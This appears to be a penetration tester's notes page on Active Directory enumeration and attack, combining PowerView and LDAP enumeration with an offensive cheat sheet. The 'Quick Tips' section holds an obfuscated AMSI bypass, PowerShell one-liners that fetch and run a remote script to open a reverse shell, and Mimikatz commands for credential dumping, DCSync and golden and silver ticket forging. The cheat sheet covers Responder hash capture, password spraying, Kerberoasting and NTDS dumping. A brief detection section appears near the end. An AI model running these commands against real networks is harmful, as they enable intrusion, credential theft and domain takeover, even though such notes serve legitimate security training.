# Enumeration

{% code overflow="wrap" %}
```bash
• The AD snap-ins of the Microsoft Management Console.
• The net commands of Command Prompt.
• The AD-RSAT cmdlets of PowerShell.
• Bloodhound.

ssh za.tryhackme.com\\leslie.young@thmjmp1.za.tryhackme.com

nslookup corp.domain.com #if it resolves, we visit the website on browser

# Service Principal Name (SPN) descriptions
https://adsecurity.org/?page_id=183
# Get-SPN script
https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/Get-SPN.ps1

# Impacket’s GetADUsers.py will attempt to gather data about the domain’s users and their corresponding email addresses.
python3 GetADUsers.py -all test.local/john:password123 -dc-ip 10.10.10.1
```
{% endcode %}

Targets: Domain Admins, Enterprise Admins

Once we gain access to additional users -> repeat enum process to pivot

[https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups)

| Domain Admins     | Users of this group have administrative privileges over the entire domain. By default, they can administer any computer on the domain, including the DCs. |
| ----------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Server Operators  | Users in this group can administer Domain Controllers. They cannot change any administrative group memberships.                                           |
| Backup Operators  | Users in this group are allowed to access any file, ignoring their permissions. They are used to perform backups of data on computers.                    |
| Account Operators | Users in this group can create or modify other accounts in the domain.                                                                                    |

{% code overflow="wrap" fullWidth="true" %}
```powershell
# NOTE: when log in via RDP, take into account the username domain\user like corp\Administrator instead of just Administrator

xfreerdp /u:$USER /d:domain.com /v:$IP
whoami # analyze if it says corp\user or CLIENT02\user, first one means we are logged in on the domain and second one is just a local account on the host
net user /domain
net user $USER /domain
net group /domain
net group $GROUP /domain
# Change domain password
net user myuser Password123 /domain
LDAP://HostName[:PortNumber][/DistinguishedName]
CN=peter,CN=Users,DC=domain,DC=com # DistinguishedName (DN)
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
([adsi]'').distinguishedName
# Reset password
Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose # force password reset at next logon

# PowerView
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser
Get-NetUser | select cn
Get-NetUser "myuser"
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetGroup "Sales Department" | select member
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
# Determine if our current user has administrative permissions on any computers in the domain
Find-LocalAdminAccess
# Discover logged in users
Get-NetSession -ComputerName files04 -Verbose
# retrieve the permissions for the object we define with the -Path flag
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
# Find logged in users with PsLoggedon (SysInternals)
.\PsLoggedon.exe \\files04
# Object Permissions (ACE/ACL)
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change of the object
Self (Self-Membership): Add ourselves to e.g. a group
Get-ObjectAcl -Identity $user
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
net group "Management Department" stephanie /add /domain
Get-NetGroup "Management Department" | select member
net group "Management Department" stephanie /del /domain
# Domain Shares
Find-DomainShare
ls \\dc1.corp.com\sysvol\corp.com\ # if SYSVOL is a domain share
# SYSVOL folder is mapped to %SystemRoot%\SYSVOL\Sysvol\domain-name
ls \\$HOSTNAME\$SHARE

# SharpHound
Import-Module .\Sharphound.ps1
Get-Help Invoke-BloodHound
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\ -OutputPrefix "audit"
# SharpHound supports looping (cyclical queries) for example 10 min so if a user logs in in 10 min we could catch that related info
BloodHound > Settings > Node Label Display > Always Display
IMPORTANT: Click on Refresh Database Stats to not miss anything when the full load lasts more
IMPORTANT2: If shortest path to sth and hover the starting point/user/group, the light will say until which target we can escalate.


[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
# LDAP communication with AD is not always straight-forward, but we'll leverage an Active Directory Services Interface (ADSI)3 (a set of interfaces built on COM4) as an LDAP provider. 
([adsi]'').distinguishedName


# PS1 SCRIPT
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}

$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
$group.properties.member
```
{% endcode %}

## Cheatsheet

| Command                                                                                           | Description                                                                                                        |
| ------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| sudo responder -I ens224 -A                                                                       | Start Responder in analysis mode                                                                                   |
| sudo responder -I ens224 -w -d                                                                    | Start network traffic response spoofing with Responder to gather NTLMv2 password hashes                            |
| kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results               | Enumerate valid Active Directory users for password spraying                                                       |
| hashcat -m 5600 bsmith\_ntlmv2 /usr/share/wordlists/rockyou.txt                                   | Attempt to crack an NTLMv2 password hash gathered with Responder using the Hashcat tool                            |
| crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol                                 | Enumerate the domain password policy using CrackMapExec                                                            |
| crackmapexec smb 10.129.203.121 -u '' -p '' --users --export $(pwd)/users.txt                     | Check for SMB NULL sessions on a domain controller host and enumerate valid users                                  |
| enum4linux -P 172.16.5.5                                                                          | Leverage an SMB NULL session on a domain controller host to verify the domain password policy                      |
| kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid\_users.txt Welcome1           | Perform a password spraying attack using the Kerbrute tool                                                         |
| Import-Module ActiveDirectory                                                                     | Load the built-in Active Directory PowerShell module on a Windows host                                             |
| Get-ADUser -Filter \* \| select Name                                                              | List all domain users using the Active Directory PowerShell module Get-ADUser cmdlet and filter by the username    |
| Get-DomainUser \* \| Select-Object samaccountname,description                                     | Check the description field of all domain users for sensitive data such as passwords                               |
| GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday                                    | Kerberoast from a Linux attack host                                                                                |
| bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u bsmith -p Welcome1         | Run the BloodHound Python version from a Linux attack host to map out the domain                                   |
| SharpHound.exe -c all --zipfilename inlanefreight\_bloodhound                                     | Run the SharpHound C# ingestor from a Windows attack host to map out the domain                                    |
| Invoke-BloodHound -CollectionMethod all -ZipFileName ilfreight\_bloodhound                        | Run the SharpHound PowerShell ingestor from a Windows attack host to map out the domain                            |
| Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap                                          | Kerberoast admin accounts using the Rubeus tool from a Windows attack host                                         |
| secretsdump.py -outputfile inlanefreight\_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss | Dump the NTDS Active Directory database to retrieve NTLM password hashes for all domain users for offline cracking |

## Quick Tips

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS> Get-ADUser -identity j.smith -properties *

# Amsi bypass
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

# Powershell Execution policy Bypass
powershell -ep bypass

# To input the output of the first command into second command use this powershell technique
# %{} is an alias for ForEach-Object{}
# ?{} is an alias for Where-Object{}
# $_ is variable
<First command> | %{<Second command> -<argument> $_}

# To filter out an object type we can use this technique with pipe.
?{$_.<object> -eq '<value>’'}

# Find local admin access
Find-LocalAdminAccess

# Know if a user is local administrator on Windows
net group /domain and net localgroup /domain
or, just crackmapexec

# Get Domain sid
Get-DomainSID
Arguments -Domain “domain name”

# Get DC
Get-NetDomainController
Arguments -Domain “domain name”

# Get users in current domain
Get-NetUser
Arguments -UserName “username”

# Get user properties
Get-UserProperty
Arguments -Properties pwdlastset

# Search for a particular string in a user's attributes
Find-UserField -SearchField Description -SearchTerm "built"

# Get all computers
Get-NetComputer -FullData
Many arguments -OperatingSystem -Ping -FullData

# Get groups
Get-NetGroup
Arguments -FullData -Domain

# Get members of a particular group
Get-NetGroupMember -GroupName "Domain Admins"

# Group Policies
Get-NetGPO Get-NetGPO -ComputerName Get-NetGPOGroup

# Get users that are part of a Machine's local Admin group
Find-GPOComputerAdmin -ComputerName

# Get OUs
Get-NetOU -FullData Get-NetGPO -GPOname

# Mapping forest
Get-NetForest -Verbose
Get-NetForestDomain -Verbose

# Mapping trust
Get-NetDomainTrust
Arguments -Domain
Get-NetForestDomain -Verbose | Get-NetDomainTrust

# Finding Constrained Delegation
Get-DomainUser -TrustedToAuth (Poweview Dev.)

# Finding UnConstrained Delegation
Get-NetComputer -UnConstrained

# Get ACLs
Get-ObjectAcl -SamAccountName -ResolveGUIDs Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose

# Search for interesting ACEs
Invoke-ACLScanner -ResolveGUIDs

# Reverse Shell
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.113/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.X -Port 443
powershell.exe iex (iwr http://172.16.100.113/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.113 -Port 443

#Mimikatz
# Make ntlm ps-session
Invoke-Mimikatz -Command '"sekurlsa::pth /user: /domain: /ntlm: /run:powershell.exe"'

# Dump creds
Invoke-Mimikatz
Invoke-Mimikatz -Command ‘“lsadump::lsa /patch”’
Invoke-Mimikatz -Command '"lsadump::dcsync /user:\krbtgt"'
(dcsync requires 3 permission )

# Tickets
Inject ticket:-
Invoke-Mimikatz -Command '"kerberos::ptt <location of .kirbi tkt>"'
Export Tickets:-
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Golden tkt
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:<krbtgt hash> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

# Silver tkt
Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<target> /service:<ServiceType> /rc4:<rc4 NTLM Hash of user> /user:<UserToImpersonate> /ptt"'

# TGT tkt
kekeo.exe tgt::ask /user:<user name> /domain:<domain name> /rc4:<rc4 NTLM Hash of user>

# TGS tkt
Kekeo.exe
tgs::s4u /tgt:tgt_ticket.kirbi /user:<user>@<domain> /service:<service name>/<server name>
```
{% endcode %}

## bloodyAD

{% code overflow="wrap" fullWidth="true" %}
```bash
# One of the best tools for AD privesc is bloodyAD and also accepts Kerberos authentication.
https://github.com/CravateRouge/bloodyAD
bloody-AD -h domain.local -u $USER -p $PASS --host $HOSTNAME get search --filter '(ObjectClass=ms...) --attr $ATTRIBUTE
```
{% endcode %}

## Find Domain SID

{% code overflow="wrap" fullWidth="true" %}
```bash
nxc ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid
LDAP        DC1.scrm.local  389    DC1.scrm.local   [*]  x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)
LDAPS       DC1.scrm.local  636    DC1.scrm.local   [+] scrm.local\sqlsvc 
LDAPS       DC1.scrm.local  636    DC1.scrm.local   Domain SID S-1-5-21-2743207045-1827831105-2542523200
```
{% endcode %}

## Service Principal Names (SPNs)

{% code overflow="wrap" fullWidth="true" %}
```sh
setspn -L iis_service
Get-NetUser -SPN | select samaccountname,serviceprincipalname
nslookup.exe web01.domain.com

# Query SPN
ldapsearch -x -H ldap://$IP -D 'c.neri@vintage.htb' -w 'Zer0the0ne' -b "DC=vintage,DC=htb" "cn=svc_sql" servicePrincipalName 
Get-ADUser -Identity c.neri -Properties ServicePrincipalNames

# Add SPN
Set-ADUser -Identity c.neri -ServicePrincipalNames @{Add="cifs/vintage.htb"}
# FROM LINUX
# First, we configured a file with the modifications
└─$ cat spn.ldif                                                                                                                                                   
dn: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
changetype: modify
add: servicePrincipalName
servicePrincipalName: cifs/dc01.vintage.htb
# Then we use ldapmodify with c.neri creds
└─$ ldapmodify -x -H ldap://$IP -D 'c.neri@vintage.htb' -W -f spn.ldif                                                                                                       
Enter LDAP Password:                                                                                                                                                         
modifying entry "CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb"                                                                                                              
```
{% endcode %}

## Credential Injection

{% code overflow="wrap" fullWidth="true" %}
```powershell
runas.exe /netonly /user:<domain>\<username> cmd.exe # /netonly -> all network communication will use these injected credentials for auth
# Then the proof to confirm creds work on that cmd.exe is listing SYSVOL directory, but first we make sure there is proper DNS resolution 
$dnsip = "<DC IP>"
$index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex' #  'Ethernet' will be whatever interface is connected to the network
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
nslookup sub.domain.com # to verify DNS is working
# Finally test our credentials
dir \\sub.domain.com\SYSVOL\
# IP vs Hostnames
Difference between dir \\za.tryhackme.com\SYSVOL and dir \\<DC IP>\SYSVOL is with hostname first try will be Kerberos and with IP we force NTLM. Might be useful NTLM in case a company monitors OverPass and Pass-The-Hash attacks.
https://labs.withsecure.com/publications/pth-attacks-against-ntlm-authenticated-web-applications
```
{% endcode %}

## Microsoft Management Console (MMC)

{% code overflow="wrap" fullWidth="true" %}
```sh
    Press Start
    Search "Apps & Features" and press enter
    Click Manage Optional Features
    Click Add a feature
    Search for "RSAT"
    Select "RSAT: Active Directory Domain Services and Lightweight Directory Tools" and click Install
    Run mmc.exe
In MMC, we can now attach the AD RSAT Snap-In:
    Click File -> Add/Remove Snap-in
    Select and Add all three Active Directory Snap-ins
    Click through any errors and warnings
    Right-click on Active Directory Domains and Trusts and select Change Forest
    Enter sub.domain.com as the Root domain and Click OK
    Right-click on Active Directory Sites and Services and select Change Forest
    Enter sub.domain.com as the Root domain and Click OK
    Right-click on Active Directory Users and Computers and select Change Domain
    Enter sub.domain.com as the Domain and Click OK
    Right-click on Active Directory Users and Computers in the left-hand pane
# Users and Computers
Click on Active Directory Users and Computers > sub.domain.com > People to find users and Servers or Workstations to find domain-joined machines
```
{% endcode %}

## Command Prompt

{% code overflow="wrap" %}
```
https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems
net commands
```
{% endcode %}

## PowerShell

{% code overflow="wrap" fullWidth="true" %}
```powershell
https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps
Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties * # Server is the DC hostname, needed in case we are not domain-joined
Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A
Get-ADUser -Filter * -Properties * | select name,description
Get-ADGroup -Identity Administrators -Server za.tryhackme.com
Get-ADGroup -Identity Administrators -Server za.tryhackme.com -Properties *
Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com
# AD objects changed after a specific date
$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
# Accounts that could be locked out
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
Get-ADDomain -Server za.tryhackme.com
# Change AD user's password
Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
```
{% endcode %}

## Additional Enumeration Techniques

[https://book.hacktricks.xyz/pentesting/pentesting-ldap](https://book.hacktricks.xyz/pentesting/pentesting-ldap)

[https://0xinfection.github.io/posts/wmi-ad-enum/](https://0xinfection.github.io/posts/wmi-ad-enum/)

## Mitigations

* Powerful AD enumeration techniques such as Sharphound generate a significant amount of LogOn events when enumerating session information. Since it executes from a single AD account, these LogOn events will be associated with this single account. We can write detection rules to detect this type of behaviour if it occurs from a user account.
* We can write signature detection rules for the tools that must be installed for specific AD enumeration techniques, such as the SharpHound binaries and the AD-RSAT tooling.
* Unless used by employees of our organisation, we can monitor the use of Command Prompt and Powershell in our organisation to detect potential enumeration attempts from unauthorised sources.

## DACL Mindmap

<figure><img src="../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

## Currently Logged on Users

```powershell
Import-Module .\PowerView.ps1
PS> Get-NetLoggedon -ComputerName client251 # last param is target workstat or server
PS> Get-NetSession -ComputerName dc01 #dc01 is the DC
```

## Service accounts

[https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-service-accounts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-service-accounts)

## Scripting

{% tabs %}
{% tab title="Users and attributes" %}
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name 
$SearchString = "LDAP://" 
$SearchString += $PDC + "/" 
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName 
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString) 
$objDomain = New-Object System.DirectoryServices.DirectoryEntry 
$Searcher.SearchRoot = $objDomain 
$Searcher.filter="samAccountType=805306368" 
$Result = $Searcher.FindAll() 
Foreach($obj in $Result) 
{ 
    Foreach($prop in $obj.Properties) 
    { 
        $prop 
    } 
    Write-Host "------------------------" 
}

NOTE: $Searcher.filter can be changed to sth like "name=Jeff_Admin"
```
{% endtab %}

{% tab title="Resolving Nested Groups" %}
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name 
$SearchString = "LDAP://" 
$SearchString += $PDC + "/" 
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName 
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString) 
$objDomain = New-Object System.DirectoryServices.DirectoryEntry 
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(objectClass=Group)" #enum groups
//$Searcher.filter="(name=Nested_Group)" #enum members of the group
$Result = $Searcher.FindAll() 
Foreach($obj in $Result) 
{ 
    $obj.Properties.name 
    //$obj.Properties.member
}
```
{% endtab %}

{% tab title="SPN Enumeration" %}
<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name 
$SearchString = "LDAP://" 
$SearchString += $PDC + "/" 
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName 
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString) 
$objDomain = New-Object System.DirectoryServices.DirectoryEntry 
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*" #detect registered SPNs
$Result = $Searcher.FindAll() 
Foreach($obj in $Result) 
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
}

<strong>#IF WE SEE THE FIELD SPN --> nslookup CorpWebServer.corp.com
</strong></code></pre>
{% endtab %}
{% endtabs %}



## Azure

### Azure DevOps

[https://github.com/xforcered/ADOKit](https://github.com/xforcered/ADOKit)

### ROADtools

[https://github.com/dirkjanm/ROADtools](https://github.com/dirkjanm/ROADtools)

